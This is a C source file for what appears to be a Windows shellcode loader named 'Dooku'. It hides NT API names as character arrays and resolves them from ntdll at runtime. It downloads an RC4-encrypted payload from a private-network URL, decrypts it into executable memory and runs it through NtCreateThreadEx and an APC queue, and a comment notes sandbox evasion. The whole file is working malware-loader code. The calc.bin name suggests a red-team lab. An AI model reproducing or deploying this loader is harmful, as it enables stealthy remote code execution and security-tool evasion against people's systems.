//
// Created by j4ck on 10/13/23.
//

#include "Dooku.h"
#include "wchar.h"
#include "Encrypt.h"
#include "Http.h"
#include <windows.h>
#include "Win32.h"


#define PAYLOAD_SIZE 276

wchar_t ntdll[] = {'N', 'T', 'D', 'L', 'L', '.', 'D', 'L', 'L', '\0'};

char ntOpenProcess[] = {'N', 't', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0'};

char ntAllocateVirtualMemory[] = {'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};

char ntProtectVirtualMemory[] = {'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};

char ntWriteVirtualMemory[] = {'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};

char ntCreateThread[] = {'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', '\0'};

char ntCreateThreadEx[] = {'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '\0'};

char ntQueueApcThread[] = {'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', '\0'};

WCHAR url[] = {'h', 't', 't', 'p', ':', '/', '/', '1', '7', '2', '.', '1', '6', '.', '7', '.', '1', '3', '0', ':', '8', '0', '8', '1', '/', 'c', 'a', 'l', 'c', '.', 'b', 'i', 'n', '\0'};

const unsigned char key[] = {
        't',
        'e',
        's',
        't',
        'i',
        'n',
        'g',
        '1',
        '2',
        '3',
        '\0'
};


// Decrypt Key
void Decrypt(LPVOID lpBuffer, LPVOID lpBufferTwo) {
    // Initialization
    Rc4Context ctx = { 0 };

    rc4Init(&ctx, key, sizeof(key));

    // Encryption //
    // plaintext - The payload to be encrypted
    // ciphertext - A buffer that is used to store the outputted encrypted data
    rc4Cipher(&ctx, lpBuffer, lpBufferTwo, PAYLOAD_SIZE);
}



BOOL WelcomeToTheDarkSide() {
    // Perform some type of computation / loading to avoid possible sandboxes.

    HANDLE hProcess         = NULL;

    // Encrypted Payload (RW)
    LPVOID lpBuffer         = NULL;

    // RWX Buffer
    LPVOID lpBufferRunner   = NULL;

    SIZE_T sSizeRunner      = PAYLOAD_SIZE;
    SIZE_T sSize            = PAYLOAD_SIZE;

    ULONG oldAccess = 0;

    // Get Current Process Psuedo Handle
    hProcess = GetCurrentProcess();
    if (hProcess == NULL) {
        wprintf(L"Failed to Get Current Process Handle  %d\n", GetLastError());
        return -1;
    }

    // Create RWX Runner Buffer
    // Allocating 16 bytes to the temp buffer
    NTSTATUS status = Instance->SithVirtualAlloc(hProcess, &lpBufferRunner, 0, &sSizeRunner, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    wprintf(L"Allocated Memory: %X\n", status);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    wprintf(L"Allocated Memory at Address: %p\n", lpBuffer);

    // Fetch Encrypted Payload From Server -> Save to lpBuffer (RW)
    if (!InitConnection(hProcess, &lpBuffer)) {
        wprintf(L"Failed to Connect %d\n", GetLastError());
        return FALSE;
    }

    wprintf(L"Fetched Encrypted Payload From Server : %p\n", lpBuffer);

    // Change Permissions on Runner Buffer to RWX.
    status = Instance->SithVirtualProtect(hProcess, &lpBufferRunner, &sSizeRunner, PAGE_EXECUTE_READWRITE, &oldAccess);
    if (!NT_SUCCESS(status)) {
        wprintf(L"Failed to Protect Ze Memory! %X\n", status);
        return FALSE;
    }

    // Decrypt Payload and Save to Runner Buffer
    Decrypt(lpBuffer, lpBufferRunner);


    // Setup Thread
    HANDLE hThread = NULL;
    CONTEXT threadContext;
    CLIENT_ID clientId;
    PS_ATTRIBUTE_LIST attributeList;

    // Execute Thread
    status = Instance->SithCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, lpBufferRunner, NULL, NULL, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        wprintf(L"Failed to Execute Ze Thread! %X\n", status);
        return FALSE;
    }


    CloseHandle(hProcess);
    status = Instance->SithQueueApcThread(hThread, (PIO_APC_ROUTINE)lpBufferRunner, NULL, NULL, NULL);
    Sleep(3000);
    //DWORD waitStatus = WaitForSingleObject(hThread, INFINITE);

    return TRUE;

}


// Init Function
// Start Ze Loading Of Ze Foonctionz!!
BOOL PleasureOfYouToJoinUs() {
    Instance->SithOpenProcess           = (NtOpenProcess) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntOpenProcess);
    Instance->SithVirtualAlloc          = (NtAllocateVirtualMemory) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntAllocateVirtualMemory);
    Instance->SithVirtualProtect        = (NtProtectVirtualMemory) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntProtectVirtualMemory);
    Instance->SithWriteVirtualMemory    = (NtWriteVirtualMemory) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntWriteVirtualMemory);
    Instance->SithCreateThread          = (NtCreateThread) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntCreateThread);
    Instance->SithCreateThreadEx        = (NtCreateThreadEx) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntCreateThreadEx);
    Instance->SithQueueApcThread        = (NtQueueApcThread) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntQueueApcThread);

    //wcscpy(&Instance->url, url); // This breaks ze program

    if (Instance->SithOpenProcess == NULL) {
        return FALSE;
    }
    return TRUE;
}